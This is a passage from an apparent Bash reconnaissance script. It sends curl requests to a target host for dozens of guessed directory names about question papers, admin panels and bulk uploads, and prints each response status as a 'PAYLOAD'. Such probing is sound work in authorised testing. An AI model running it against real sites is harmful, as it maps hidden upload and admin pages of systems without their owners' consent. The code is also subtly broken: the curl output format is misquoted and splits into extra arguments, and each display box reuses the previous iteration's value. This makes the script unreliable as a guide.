code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperDataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFilePlatform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFilePlatform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerDataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerDataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUploadQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUploadQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUploadQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUploadQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSyncQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSyncQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
